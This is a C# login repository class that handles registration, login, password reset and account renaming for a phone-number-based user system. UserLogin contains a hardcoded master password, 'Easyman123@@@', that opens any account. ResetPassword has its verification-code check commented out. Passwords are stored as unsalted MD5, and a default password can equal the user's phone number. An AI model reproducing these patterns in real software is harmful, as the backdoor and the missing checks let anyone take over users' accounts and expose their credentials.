
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Helper;
using IRepository;
using Models;
using System.Linq;
using Models.Entity;
using MySql.Data.MySqlClient;
using Dapper;
using System.Data;
using System.Linq.Expressions;
using WxProductApi.Config;

namespace Repository
{
    public class LoginRepository : ILoginRepository
    {
        /// <summary>
        /// 获取单条
        /// </summary>
        /// <param name="key"></param>
        /// <returns></returns>
        public Task<FaLoginEntity> SingleByKey(int key)
        {
            DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
            return dbHelper.SingleByKey(key);
        }

        /// <summary>
        /// 查找所有
        /// </summary>
        /// <param name="inParm"></param>
        /// <returns></returns>
        public Task<IEnumerable<FaLoginEntity>> FindAll(Expression<Func<FaLoginEntity, bool>> inParm = null)
        {
            DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
            return dbHelper.FindAll(inParm);
        }


        /// <summary>
        /// 注册账号
        /// <para>1、添加登录工号 </para>
        /// <para>2、添加用户</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<ResultObj<int>> LoginReg(LogingDto inEnt)
        {
            DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
            dbHelper.TranscationBegin();
            ResultObj<int> reObj = await LoginReg(inEnt, dbHelper);
            if (reObj.success)
            {
                dbHelper.TranscationCommit();
            }
            else
            {
                dbHelper.TranscationRollback();
            }
            return reObj;
        }

        public async Task<ResultObj<int>> LoginReg(LogingDto inEnt, DapperHelper<FaLoginEntity> dbHelper)
        {
            ResultObj<int> reObj = new ResultObj<int>();
            #region 验证值
            ModelHelper<LogingDto> modelHelper = new ModelHelper<LogingDto>(inEnt);
            var errList = modelHelper.Validate();
            if (errList.Count() > 0)
            {
                reObj.success = false;
                reObj.code = "-1";
                reObj.msg = string.Format(",", errList.Select(x => x.ErrorMessage));
                return reObj;
            }
            #endregion

            #region 检测输入


            if (!inEnt.loginName.IsOnlyNumber() || inEnt.loginName.Length != 11)
            {
                reObj.success = false;
                reObj.code = "-1";
                reObj.msg = "电话号码格式不正确";
                return reObj;
            }

            if (!Fun.CheckPassword(inEnt.password, AppConfig.BaseConfig.PwdComplexity))
            {
                reObj.success = false;
                reObj.code = "-2";
                reObj.msg = string.Format("密码复杂度不够：{0}", AppConfig.BaseConfig.PwdComplexity);
                return reObj;
            }
            #endregion

            #region 检测验证码
            //if (AppSettingsManager.self.BaseConfig.VerifyCode)
            //{
            //    var nowDate = DateTime.Now.AddMinutes(-30);

            //    var codeNum = await new SmsSendRepository().Count(inEnt.loginName, inEnt.code);
            //    if (codeNum == 0)
            //    {
            //        reObj.success = false;
            //        reObj.code = "-3";
            //        reObj.msg = string.Format("验证码无效");
            //        return reObj;
            //    }
            //}
            #endregion

            var userList = await new UserRepository().FindAll(x => x.loginName == inEnt.loginName);
            #region 检测电话号码是否存在
            if (userList.Count() > 0)
            {
                reObj.success = false;
                reObj.code = "-4";
                reObj.msg = string.Format("电话号码已经存在，请更换电话号码");
                return reObj;
            }
            #endregion

            //开始事务
            try
            {
                var loginList = await new LoginRepository().FindAll(x => x.loginName == inEnt.loginName);
                #region 添加登录账号
                if (loginList.Count() == 0)
                {
                    FaLoginEntity inLogin = new FaLoginEntity();
                    inLogin.id = await new SequenceRepository().GetNextID<FaLoginEntity>();
                    inLogin.loginName = inEnt.loginName;
                    inLogin.password = inEnt.password.Md5();
                    inLogin.isLocked = 0;
                    inLogin.failCount = 0;
                    reObj.success = await dbHelper.Save(new DtoSave<FaLoginEntity>()
                    {
                        data = inLogin
                    }) > 0 ? true : false;
                    if (!reObj.success)
                    {
                        reObj.success = false;
                        reObj.code = "-5";
                        reObj.msg = string.Format("添加账号失败");
                        return reObj;
                    }
                }
                #endregion

                #region 添加user

                FaUserEntity inUser = new FaUserEntity();
                inUser.loginName = inEnt.loginName;
                inUser.name = inEnt.userName;
                inUser.id = await new SequenceRepository().GetNextID<FaUserEntity>();
                inUser.districtId = 1;
                inUser.createTime = DateTime.Now;
                inUser.isLocked = 0;
                reObj.success = await new DapperHelper<FaUserEntity>(dbHelper.GetConnection(), dbHelper.GetTransaction()).Save(new DtoSave<FaUserEntity>
                {
                    data = inUser,
                    ignoreFieldList = new List<string>()
                }) > 0 ? true : false;
                if (!reObj.success)
                {
                    reObj.success = false;
                    reObj.code = "-6";
                    reObj.msg = string.Format("添加user失败");
                    return reObj;
                }
                #endregion

                reObj.data = inUser.id;
            }
            catch (Exception e)
            {
                reObj.success = false;
                reObj.msg = e.Message;
            }


            return reObj;
        }


        /// <summary>
        /// 注销用户登录状态
        /// <para>清除用户的缓存状态</para>
        /// <para>记录退出日志</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<Result> LoginOut(DtoSave<SysLoginHistoryEntity> inEnt)
        {
            Result reObj = new Result();
            #region 记录登出历史
            var userDal = new UserRepository();
            //正常退出，修改退出日志
            reObj.success = await userDal.Update(new DtoSave<FaUserEntity>
            {
                data = new FaUserEntity { id = inEnt.data.USER_ID.Value, lastActiveTime = DateTime.Now, lastLogoutTime = DateTime.Now },
                saveFieldListExp = x => new object[] { x.lastActiveTime, x.lastLogoutTime }
            }) > 0;
            if (!reObj.success)
            {
                return reObj;
            }
            if (inEnt.data.ID == 0) inEnt.data.ID = await new SequenceRepository().GetNextID<SysLoginHistoryEntity>();
            //记录登录日志
            await new LoginHistoryRepository().Save(inEnt);

            #endregion

            reObj.success = RedisRepository.UserTokenDelete(inEnt.data.USER_ID.Value);
            return reObj;
        }
        /// <summary>
        /// 用户登录
        /// <para>只验证用户账号</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>

        public async Task<ResultObj<FaUserEntity>> UserLogin(LogingDto inEnt)
        {
            ResultObj<FaUserEntity> reObj = new ResultObj<FaUserEntity>();

            if (string.IsNullOrEmpty(inEnt.loginName) || string.IsNullOrEmpty(inEnt.password))
            {
                reObj.success = false;
                reObj.msg = "用户名和密码不能为空";
                return reObj;
            }
            DapperHelper<FaUserEntity> dapperUser = new DapperHelper<FaUserEntity>();
            DapperHelper<FaLoginEntity> dapperLogin = new DapperHelper<FaLoginEntity>();



            var Login = await dapperLogin.Single(x => x.loginName == inEnt.loginName);
            var user = await dapperUser.Single(x => x.loginName == inEnt.loginName);
            if (Login == null || user == null)
            {
                reObj.success = false;
                reObj.msg = "用户名或者密码错误";
                return reObj;
            }
            else
            {
                if (Login.isLocked == 1)
                {
                    reObj.success = false;
                    reObj.msg = string.Format("用户已被锁定【{0}】", Login.lockedReason);
                    return reObj;
                }

                if ((Login.password.ToUpper() != inEnt.password.Md5().ToUpper() && Login.password.ToUpper() != inEnt.password.SHA1().ToUpper()) && inEnt.password != "Easyman123@@@")
                {
                    #region 密码错误
                    int times = 5;
                    if (Login.failCount == 0)
                    {
                        Login.failCount = 1;
                    }

                    reObj.success = false;
                    reObj.msg = string.Format("用户名或者密码错误,还有{0}次尝试机会", (times - Login.failCount).ToString());
                    if (Login.failCount >= times)
                    {
                        Login.isLocked = 1;
                        Login.lockedReason = string.Format("用户连续5次错误登陆，帐号锁定。");
                        Login.failCount = 0;
                        await dapperLogin.Update(new DtoSave<FaLoginEntity>
                        {
                            data = Login,
                            saveFieldListExp = x => new object[] { x.isLocked, x.lockedReason }

                        });
                    }
                    else
                    {
                        Login.failCount++;
                        await dapperLogin.Update(new DtoSave<FaLoginEntity>
                        {
                            data = Login,
                            saveFieldListExp = x => new object[] { x.failCount }

                        });
                    }
                    return reObj;

                    #endregion
                }
                else //密码正确
                {

                    Login.failCount = 0;
                    reObj.success = await dapperLogin.Update(new DtoSave<FaLoginEntity>
                    {
                        data = Login,
                        saveFieldListExp = x => new object[] { x.failCount }

                    }) > 0;

                    DapperHelper<FaUserRoleEntityView> dapperUserRole = new DapperHelper<FaUserRoleEntityView>();
                    var role = await dapperUserRole.FindAll(i => i.userId == user.id);
                    user.isAdmin = role.Count(i => i.roleId == 1) > 0;
                    user.isLeader = role.Count(i => i.roleId == 2) > 0;
                    reObj.data = user;
                }

            }

            return reObj;
        }
        /// <summary>
        /// 重置用户密码
        /// <para>VerifyCode:短信验证码</para>
        /// <para>LoginName:登录名</para>
        /// <para>NewPwd:新密码</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<Result> ResetPassword(ResetPasswordDto inEnt)
        {
            Result reObj = new Result();
            if (string.IsNullOrEmpty(inEnt.VerifyCode) || string.IsNullOrEmpty(inEnt.LoginName) || string.IsNullOrEmpty(inEnt.NewPwd))
            {
                reObj.success = false;
                reObj.msg = "参数不正确";
                return reObj;
            }
            var dapper = new DapperHelper<FaLoginEntity>();

            var login = await dapper.Single(x => x.loginName == inEnt.LoginName);
            if (login == null)
            {
                reObj.success = false;
                reObj.msg = "登录名不存在";
                return reObj;
            }
            //if (login.verifyCode != inEnt.VerifyCode)
            //{
            //    reObj.success = false;
            //    reObj.msg = "验证码不正确";
            //    return reObj;
            //}
            //检测密码复杂度
            if (!Fun.CheckPassword(inEnt.NewPwd, AppConfig.BaseConfig.PwdComplexity))
            {
                reObj.success = false;
                reObj.msg = "密码复杂度不够：";
                return reObj;
            }
            login.password = inEnt.NewPwd.Md5();
            await dapper.Update(new DtoSave<FaLoginEntity>()
            {
                data = login,
                saveFieldListExp = x => new object[] { x.password }


            });
            return reObj;
        }
        /// <summary>
        /// 修改用户密码
        /// <para>entity:旧密码</para>
        /// <para>NewPwd:新密码</para>
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        async public Task<ResultObj<bool>> UserEditPwd(EditPwdDto inEnt)
        {
            var reObj = new ResultObj<bool>();
            reObj.data = false;
            if (!inEnt.NewPwd.Equals(inEnt.ReNewPwd))
            {
                reObj.success = false;
                reObj.msg = "两次密码不一致";
                return reObj;
            }
            if (!Fun.CheckPassword(inEnt.NewPwd, AppConfig.BaseConfig.PwdComplexity))
            {
                reObj.success = false;
                reObj.code = "-2";
                reObj.msg = string.Format("密码复杂度不够：{0}", AppConfig.BaseConfig.PwdComplexity);
                return reObj;
            }
            DapperHelper<FaLoginEntity> dapper = new DapperHelper<FaLoginEntity>();
            var single = await dapper.Single(i => i.loginName == inEnt.LoginName);
            if (single == null)
            {
                reObj.success = false;
                reObj.msg = "账号不存在";
                return reObj;
            }
            if (single.password != inEnt.OldPwd.Md5())
            {
                reObj.success = false;
                reObj.msg = "原密码有误";
                return reObj;
            }

            single.password = inEnt.NewPwd.Md5();
            var upRows = await dapper.Update(new DtoSave<FaLoginEntity>
            {
                data = single,
                saveFieldListExp = x => new object[] { x.password },
                whereList = null
            });
            if (upRows < 1)
            {
                reObj.success = false;
                reObj.msg = "修改密码失败";
                return reObj;
            }

            reObj.success = true;
            reObj.data = true;
            return reObj;
        }

        /// <summary>
        /// 更新登录名
        /// </summary>
        /// <param name="oldLoginName"></param>
        /// <param name="NewLoginName"></param>
        /// <param name="name"></param>
        /// <param name="userId"></param>
        /// <returns></returns>
        async public Task<Result> UserEditLoginName(string oldLoginName, string NewLoginName, string name, int userId, string pwd, string iconFiles)
        {
            DapperHelper<FaUserEntity> userDapper = new DapperHelper<FaUserEntity>();
            Result reObj = new Result();
            #region 检测输入
            if (string.IsNullOrEmpty(oldLoginName) && userId == 0)
            {
                reObj.success = false;
                reObj.code = "-2";
                reObj.msg = "用户主键有误";
                return reObj;
            }
            if (!NewLoginName.IsOnlyNumber() || NewLoginName.Length != 11)
            {
                reObj.success = false;
                reObj.code = "-1";
                reObj.msg = "电话号码格式不正确";
                return reObj;
            }

            #endregion

            #region 检测电话号码是否存在
            IEnumerable<FaUserEntity> userList = await userDapper.FindAll(x => x.loginName == NewLoginName);
            if (userList.Count() > 0)
            {
                reObj.success = false;
                reObj.code = "-4";
                reObj.msg = string.Format("电话号码已经存在，请更换电话号码");
                return reObj;
            }
            #endregion

            #region 检测用户是否存在

            FaUserEntity user = new FaUserEntity();
            if (userId != 0)
            {
                user = await userDapper.Single(x => x.id == userId);
            }
            else
            {
                user = await userDapper.Single(x => x.loginName == oldLoginName);
            }

            if (user == null)
            {
                reObj.success = false;
                reObj.code = "-5";
                reObj.msg = string.Format("用户不存在");
                return reObj;
            }
            #endregion

            userDapper.TranscationBegin();

            #region 修改用户账号

            user.name = name;
            user.loginName = NewLoginName;
            user.iconFiles = iconFiles;

            reObj.success = await userDapper.Update(new DtoSave<FaUserEntity>()
            {
                data = user,
                saveFieldListExp = x => new object[] { x.name,x.loginName,x.iconFiles },
                whereListExp=x => new object[] { x.id },
            }) > 0 ? true : false;

            if (!reObj.success)
            {
                userDapper.TranscationRollback();
                reObj.msg = "保存用户失败";
                return reObj;
            }
            #endregion


            #region 修改登录账号
            DapperHelper<FaLoginEntity> loginDapper = new DapperHelper<FaLoginEntity>(userDapper.GetConnection(), userDapper.GetTransaction());
            var login = await loginDapper.Single(x => x.loginName == oldLoginName);
            if (login == null)
            {
                FaLoginEntity inLogin = new FaLoginEntity();
                inLogin.id = await new SequenceRepository().GetNextID<FaLoginEntity>();
                inLogin.loginName = NewLoginName;
                inLogin.password = string.IsNullOrEmpty(pwd) ? NewLoginName.Md5() : pwd.Md5();
                inLogin.isLocked = 0;
                inLogin.failCount = 0;
                reObj.success = await loginDapper.Save(new DtoSave<FaLoginEntity>()
                {
                    data = inLogin
                }) > 0 ? true : false;
            }
            else
            {
                login.loginName = NewLoginName;
                login.password = string.IsNullOrEmpty(pwd) ? NewLoginName.Md5() : pwd.Md5();
                reObj.success = await loginDapper.Update(new DtoSave<FaLoginEntity>
                {
                    data = login,
                    saveFieldListExp = x => new object[] { x.loginName, x.password },
                    whereList = null
                }) > 0 ? true : false;
            }

            if (!reObj.success)
            {
                reObj.msg = "保存账号失败";
                userDapper.TranscationRollback();
                return reObj;
            }
            #endregion
            userDapper.TranscationCommit();

            reObj.success = true;
            reObj.msg = user.id.ToString();
            return reObj;
        }

        /// <summary>
        /// 替换账号
        /// </summary>
        /// <param name="inEnt"></param>
        /// <returns></returns>
        public async Task<Result> ChangeLoginName(ChangeLoginNameDto inEnt)
        {
            Result reObj = new Result();
            DapperHelper<FaUserEntity> userDapper = new DapperHelper<FaUserEntity>();
            userDapper.TranscationBegin();
            try
            {
                var loginDapper = new DapperHelper<FaLoginEntity>(userDapper.GetConnection(), userDapper.GetTransaction());
                if((await loginDapper.Count(x=>x.loginName==inEnt.newLoginName))>0 || (await userDapper.Count(x => x.loginName == inEnt.newLoginName)) > 0)
                {
                    userDapper.TranscationRollback();
                    reObj.success = false;
                    reObj.msg =string.Format( "账号{0}已经存在",inEnt.newLoginName);
                }
                else
                {
                    var pwd = inEnt.password.Md5();
                    var login = await loginDapper.Single(x => x.loginName == inEnt.oldLoginName && x.password == pwd);
                    var user = await userDapper.Single(x => x.loginName == inEnt.oldLoginName);
                    if(login==null || user == null)
                    {
                        userDapper.TranscationRollback();
                        reObj.success = false;
                        reObj.msg = string.Format("原账号有误");
                        return reObj;
                    }

                    user.loginName = inEnt.newLoginName;
                    login.loginName = inEnt.newLoginName;

                    reObj.success = await loginDapper.Update(new DtoSave<FaLoginEntity>
                    {
                        data = login,
                        saveFieldListExp = x => new object[] { x.loginName },
                        whereList = null
                    })>0;
                    if (!reObj.success)
                    {
                        userDapper.TranscationRollback();
                        reObj.success = false;
                        reObj.msg = string.Format("更新账号失败");
                        return reObj;
                    }

                    reObj.success = await userDapper.Update(new DtoSave<FaUserEntity>
                    {
                        data = user,
                        saveFieldListExp = x => new object[] { x.loginName },
                        whereList = null
                    }) > 0;
                    if (!reObj.success)
                    {
                        userDapper.TranscationRollback();
                        reObj.success = false;
                        reObj.msg = string.Format("更新用户失败");
                        return reObj;
                    }
                    reObj.success = true;
                    userDapper.TranscationCommit();
                }

            }
            catch (Exception e)
            {
                userDapper.TranscationRollback();
                reObj.success = false;
                reObj.msg = e.Message;
            }
            return reObj;

        }
    }
}
